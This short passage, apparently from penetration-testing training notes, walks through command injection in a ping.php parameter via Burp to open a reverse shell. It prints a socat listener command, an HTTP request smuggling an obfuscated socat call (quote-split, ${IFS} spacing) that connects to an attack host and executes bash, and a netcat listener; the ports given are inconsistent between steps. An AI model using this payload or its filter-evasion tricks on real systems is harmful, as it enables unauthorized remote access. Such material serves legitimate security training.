In the example below we have RCE through burp
1. We'll start a Socat listener on our attack host.
```
w1j0y@htb[/htb]$ socat file:`tty`,raw,echo=0 tcp-listen:4443
```
2. Next, we'll execute a Socat one-liner on the target host.
```
GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.14.15:8443${IFS}EXEC:bash HTTP/1.1
```
```
nc -lnvp 8443
```
3. we'll have a stable reverse shell connection on our Socat listener.